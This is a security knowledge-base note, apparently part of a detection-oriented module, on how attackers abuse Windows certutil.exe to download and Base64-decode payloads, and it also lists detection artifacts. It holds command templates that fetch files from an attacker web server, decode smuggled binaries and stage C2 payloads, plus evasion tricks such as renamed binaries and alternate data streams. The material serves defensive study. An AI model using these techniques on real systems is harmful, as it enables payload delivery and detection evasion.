# LOLBins — certutil.exe — Overview

> 🔴 **Red Flag Principle:** `certutil.exe` never spawns a helper process for its abuse techniques — the download and encode/decode verbs run entirely inside the single `certutil.exe` process, so there's no multi-hop process chain to catch the way there is for service-based lateral-movement tools. The two invariant tells are: (1) the **argument shape itself** — `-urlcache`/`-verifyctl`/`-URL` (download) or `-encode`/`-decode`/`-encodehex`/`-decodehex` (payload smuggling) are not used by any normal certificate-authority administration workflow, and that argument shape survives even if the operator renames or copies the binary; and (2) for the download verbs specifically, a **`%LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\`** cache write (`MetaData\` + `Content\<hash>`) happens as a side effect of certutil's own WinINet/CryptoAPI machinery — independent of whatever output path the operator specified. Both are detailed below and ranked for evasion-survivability in `05 - Detection and Hunting.md`.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Legitimate vs. Abused Verbs](#legitimate-vs-abused-verbs)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

`certutil.exe` is not a third-party or offensive-security-authored tool — it's a native Windows command-line utility that ships as part of **Certificate Services** (Active Directory Certificate Services / AD CS administration tooling), verified directly against Microsoft's own current documentation:

> "Certutil.exe is a command-line program installed as part of Certificate Services. You can use certutil.exe to display certification authority (CA) configuration information, configure Certificate Services, and back up and restore CA components. The program also verifies certificates, key pairs, and certificate chains."
> — [Microsoft Learn, `certutil` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

Microsoft's own docs (updated 2025-05-01 as of this writing) carry an explicit caution worth quoting verbatim, since it frames the tool's entire legitimacy posture:

> "`Certutil` isn't recommended to be used in any production code and doesn't provide any guarantees of live site support or application compatibilities. It's a tool utilized by developers and IT administrators to view certificate content information on devices."

The tool has existed since at least the **Windows 2000 / Windows Server 2003** era — Microsoft's own archived documentation (["Appendix 6: Encoding and Decoding with Hexadecimal, Binary, and Base64"](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782874(v=ws.10))) references a "V1" (Windows 2000) and "V2" (Windows Server 2003) version of `certutil.exe`, both already exposing the `-encode`/`-decode`/`-decodehex` verbs this note covers. There is no separate release history, changelog, or external maintainer to cite — it's a first-party OS component maintained by Microsoft, distributed with every Windows Vista-and-later installation regardless of whether the AD CS server role is installed, and updated in place with the OS.

Its abuse as a "living-off-the-land binary" (LOLBIN) — repurposing its certificate-related download and encoding machinery to move and disguise arbitrary attacker payloads — is catalogued by the community-maintained [**LOLBAS Project**](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) (`LOLBAS-Project/LOLBAS` on GitHub), first documented against `certutil.exe` on 2018-05-25 by Oddvar Moe, with individual technique credits to Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55, and others. This note's abuse-technique syntax and MITRE ATT&CK mappings are verified directly against LOLBAS's current [`Certutil.yml`](https://github.com/LOLBAS-Project/LOLBAS) source, cross-checked against Microsoft's own `certutil` switch reference where the two overlap.

## How It Works

Unlike the Impacket/Mimikatz-class tools elsewhere in this module, `certutil.exe`'s abuse surface isn't a custom protocol implementation — it's the **repurposing of two legitimate certificate-management code paths** that happen to be general-purpose enough to move and transform arbitrary files:

**1. The download path (`-urlcache`, `-verifyctl`, `-URL`).** Certificate Services routinely needs to fetch things over HTTP/HTTPS on a CA administrator's behalf — CRLs (Certificate Revocation Lists), AIA (Authority Information Access) certificates, and CTLs (Certificate Trust Lists) like the Windows Update-hosted AuthRoot/Disallowed lists. Microsoft's own docs describe `-URLCache`'s job as "Displays or deletes URL cache entries" and `-verifyCTL`'s `-f` flag as forcing "download from Windows Update" for a small, fixed set of CTL objects (`AuthRootWU`, `DisallowedWU`, `PinRulesWU`). Both verbs are implemented on top of the same underlying WinINet/CryptoAPI URL-fetch machinery — and that machinery doesn't actually validate that the URL it's pointed at is a certificate, CRL, or CTL at all. Pointed at an arbitrary `http(s)://` URL with an arbitrary local output path, `-urlcache -f` (and, per LOLBAS, `-verifyctl -f`) will fetch and save **any** file. This is Impacket-adjacent in spirit to `smbexec.py`'s abuse of `certutil` itself as a downloader in that module's own use-case list — see the cross-link in `02 - Hands-On Use Cases.md`.

- The fetch generates a real outbound HTTP/HTTPS request carrying a **certutil-specific `User-Agent` string** — LOLBAS's own detection/IOC catalog for this binary lists `Microsoft-CryptoAPI/10.0` and `CertUtil URL Agent` as observed user-agent values, which is a durable network-layer tell independent of the requested URL or saved filename.
- As a **side effect of the underlying CryptoAPI URL-fetch machinery**, the response is also written into a certutil-owned disk cache — verified via three independent sources (the LOLBAS `Certutil.yml` technique notes, Velociraptor's `Windows.Forensics.CertUtil` artifact documentation, and Adam/@hexacorn's writeup on the `-URL` GUI technique) as `%LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\Content\<hash>` (the actual cached bytes) alongside a parallel `MetaData\<hash>` entry recording the source URL, a Windows FILETIME download timestamp, file size, and a hash — **this happens even when the operator supplied an explicit output path**, and for `-URL`/`-verifyctl` invocations with no output path given, it's the *only* place the file lands. See `04 - Target Evidence.md` for the exact system-vs-user path split.

**2. The encode/decode path (`-encode`, `-decode`, `-encodehex`, `-decodehex`).** Certificate data routinely moves between binary DER and text-safe Base64/hex representations (a PEM-style certificate file *is* Base64), so `certutil` ships a general-purpose, **local-only, no-network** converter for exactly that: `-encode` converts a binary `InFile` to Base64 in `OutFile`; `-decode` reverses it. These verbs don't inspect or validate that the input is actually certificate-related data — any binary (an EXE, a DLL, a script) round-trips through `-encode`/`-decode` cleanly. This is what makes the pair useful for defeating content filters/mail gateways/proxy file-type blocks that inspect file extensions or binary signatures but pass a Base64-looking text blob: an operator `-encode`s a payload before it crosses a monitored boundary, then `-decode`s it back to a working binary once it's on the target. **One detail this note could not verify against Microsoft's own documentation**: community write-ups and the LOLBAS technique catalog consistently describe `certutil -encode`'s output as wrapped in PEM-style `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` header and footer lines around the Base64 body (consistent with certutil producing a file that *looks* like a valid PEM certificate) — Microsoft's own reference material documents the `-encode`/`-decode` verbs' existence and syntax but does not spell out the exact wrapper text, so treat that specific detail as widely-observed rather than officially confirmed.

```
Download path (any of -urlcache / -verifyctl / -URL, pointed at an arbitrary URL):

  cmd.exe/PowerShell ──▶ certutil.exe -urlcache -f <url> <outfile>
                              │
                              ├─▶ WinINet/CryptoAPI HTTP(S) GET, UA: "Microsoft-CryptoAPI/10.0"
                              │     or "CertUtil URL Agent"                    ──▶  attacker web server
                              │
                              ├─▶ writes <outfile> at the operator-specified path (if given)
                              │
                              └─▶ ALSO writes, as a side effect regardless of <outfile>:
                                    %LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\Content\<hash>
                                    %LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\MetaData\<hash>

Encode/decode path (no network, no admin, single process, no children):

  cmd.exe/PowerShell ──▶ certutil -decode payload.b64 payload.exe
                              │
                              └─▶ local file I/O only: reads InFile, converts, writes OutFile
```

No child process is spawned in either path — everything happens inside the single `certutil.exe` process, which is itself the reason this technique reads as "clean" to analysts expecting the parent→child spawn chains that dropped-binary or service-based techniques produce.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Transport (download verbs only) | HTTP/HTTPS via WinINet/CryptoAPI — no custom protocol; the same OS-level URL-fetch machinery Windows Update and Windows Certificate Services validation use for CRL/CTL retrieval |
| Transport (encode/decode/hex verbs) | None — purely local file I/O, no network activity at all |
| Authentication | None required for the download verbs against an anonymous-access URL; `-verifyctl`/`-CA`/`-Policy`-family verbs support Kerberos/NTLM/anonymous SSL credentials for their *legitimate* enrollment-policy uses, not relevant to the abuse techniques in this note |
| Payload transform | Base64 (`-encode`/`-decode`) or hexadecimal (`-encodehex`/`-decodehex`) — thin wrappers around Windows' standard binary-to-text certificate-data conversion routines |
| Execution context | Runs as whatever user/token invoked it — **no elevation required** for any technique in this note (LOLBAS lists every technique's required privilege as `User`, not `Administrator`) |
| Process model | Single process, no children, no services, no scheduled tasks, no named pipes — everything documented here happens inside `certutil.exe` itself |
| Binary location | `C:\Windows\System32\certutil.exe` and `C:\Windows\SysWOW64\certutil.exe` — the only two legitimate install paths, per LOLBAS's `Full_Path` listing |

## Command-Line Switches — Quick Reference

Verified against [Microsoft Learn's `certutil` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) and the [LOLBAS Project's `Certutil.yml`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/). `certutil` exposes dozens of verbs for legitimate CA administration — this table covers the download and encode/decode verbs this note is about, plus the modifier flags that appear on them. **All switches below use a single leading dash** (`certutil -urlcache ...`), matching every example in Microsoft's own docs and the LOLBAS catalog.

**Download verbs (abused for `T1105` — Ingress Tool Transfer)**

| Verb | Plain-English meaning |
|---|---|
| `-urlcache [URL \| CRL \| * [delete]] [-f] [-split]` | **Legitimate purpose:** display or delete cached URL-fetch entries. **Abuse:** `-urlcache -f <url> <outfile>` forces a fetch of any URL and saves it to any local path — the most common certutil-as-downloader syntax in the wild |
| `-verifyctl CTLobject [CertDir] [CertFile] [-f] [-split]` | **Legitimate purpose:** verify the AuthRoot/Disallowed/PinRules Certificate Trust List, optionally forcing (`-f`) a fresh pull from Windows Update for a small fixed set of CTL names. **Abuse, per LOLBAS:** pointed at an arbitrary URL with `-f`, behaves as a second downloader — LOLBAS documents `certutil.exe -verifyctl -f {REMOTEURL} {PATH}` as a working "download file from Internet" technique, saving to the specified path if given or to the `CryptnetUrlCache\Content\<hash>` cache if not |
| `-URL [URL]` | Opens the **"CertUtil URL Retrieval Tool"** — a GUI dialog (Windows 10/11 only). Even though the retrieval status shows "Failed" in the dialog, the target content is still fetched and cached to `CryptnetUrlCache\Content\<hash>`. Interactive/GUI-driven, so less common in scripted/unattended attack chains, but a real documented technique (credited to @hexacorn's research) |

**Encode/decode verbs (abused for `T1027.013` encode / `T1140` decode)**

| Verb | Plain-English meaning |
|---|---|
| `-encode InFile OutFile [-f] [-unicodetext]` | Converts a binary file to Base64 text. Legitimate use: producing a PEM-style certificate/request file. Abuse: disguising any binary (an EXE, a script) as innocuous-looking Base64 text before it crosses a monitored boundary |
| `-decode InFile OutFile [-f]` | Reverses `-encode` — converts Base64 text back to binary. Abuse: reconstituting a smuggled payload on the target after `-encode` (or any standard Base64 tool) staged it |
| `-encodehex InFile OutFile [type] [-f] [-nocr] [-nocrlf] [-UnicodeText]` | Same idea as `-encode`, using hexadecimal instead of Base64 |
| `-decodehex InFile OutFile [type] [-f]` | Reverses `-encodehex` |

**Modifier flags used across the verbs above**

| Flag | Meaning (verified against Microsoft's official options table) |
|---|---|
| `-f` | **"Force overwrite."** For the download verbs this is also what forces a fresh network fetch rather than serving a stale cache entry — the flag that appears in essentially every publicly documented certutil-download one-liner |
| `-split` | **"Split embedded ASN.1 elements, and save to files."** This is its officially documented meaning — it is **not** about chunking or resuming a download, a common misconception given how often `-urlcache -split -f` is quoted as a fixed idiom in write-ups. It's simply a flag copied by convention rather than semantic necessity in most of those one-liners |
| `-Silent` | Suppresses the crypt-context acquisition prompt/UI |
| `-p Password` | Password, where a verb needs one (not used by any technique in this note) |

## Legitimate vs. Abused Verbs

For contrast, and because an analyst reading a `certutil.exe` command line needs to know what *normal* CA-administration activity looks like: `certutil`'s actual bread-and-butter verbs are things like `-dump` (default action with no other verb given — display CA configuration), `-store`/`-viewstore` (inspect a certificate store), `-CAInfo`/`-CAPropInfo`/`-ping`/`-pingadmin` (query a Certification Authority's status and configuration), `-GetCRL`/`-CRL` (retrieve/publish revocation lists against a **known, internal CA**, not an arbitrary Internet URL), and `-verify` (validate a certificate chain). These are run by PKI/CA administrators, usually from a domain-joined admin workstation or the CA server itself, targeting internal CA hostnames — a `-urlcache`/`-verifyctl`/`-decode` invocation with an Internet URL or an arbitrary non-certificate `InFile`/`OutFile` pair is not something that workflow produces.

## Quick Use-Case List

- Fileless-style payload download via `-urlcache -f` — no PowerShell, no browser, no separate downloader tool
- `-verifyctl -f` as an alternate/less-obvious downloader, riding CTL-verification syntax
- GUI-driven download via `-URL` (Windows 10/11, interactive)
- Downloading directly into an NTFS Alternate Data Stream to hide the payload from a normal directory listing
- Base64-encoding a payload to smuggle it past a content filter, mail gateway, or file-type block
- Base64-decoding a smuggled payload back into a working binary on the target
- Hex-encode/decode as a variant transform, same smuggling logic
- Running a renamed or relocated copy of `certutil.exe` to dodge simple binary-path or image-name detections
- Chained downloader-then-execute one-liner (fetch, then immediately launch what was fetched)
- Staging a secondary C2 payload after an initial-access foothold (macro, phishing loader, or another LOLBIN) already has code execution
- Fleet-wide/mass staging of the same payload across many already-compromised hosts via C2 tasking
- Legitimate-baseline contrast use: routine CA-administrator verb usage an analyst should expect to see as background noise

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`.

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on the target | Any existing foothold that can run a command line — a macro, a script, an interactive shell, a C2 task. `certutil.exe` is not itself an initial-access vector |
| Privilege level | **None beyond a standard user token** — LOLBAS lists every technique in this note as requiring only `User` privilege, not `Administrator`. This is a common misconception worth correcting explicitly: certificate-store-modifying verbs (e.g. `-addstore`) may require elevation depending on the target store, but the download and encode/decode verbs this note covers do not |
| Network reachability (download verbs only) | Outbound HTTP/HTTPS to the payload-hosting URL. No reachability needed at all for `-encode`/`-decode`/`-encodehex`/`-decodehex`, which are purely local |
| OS version | Windows Vista and later for `-urlcache`/`-verifyctl`/`-encode`/`-decode` (LOLBAS lists Vista through 11). The GUI `-URL` technique is Windows 10/11 only |
| Pre-staged payload (encode/decode) | The operator needs the file to `-encode` before transfer, or the smuggled Base64/hex blob already delivered to the target before `-decode` reconstitutes it |
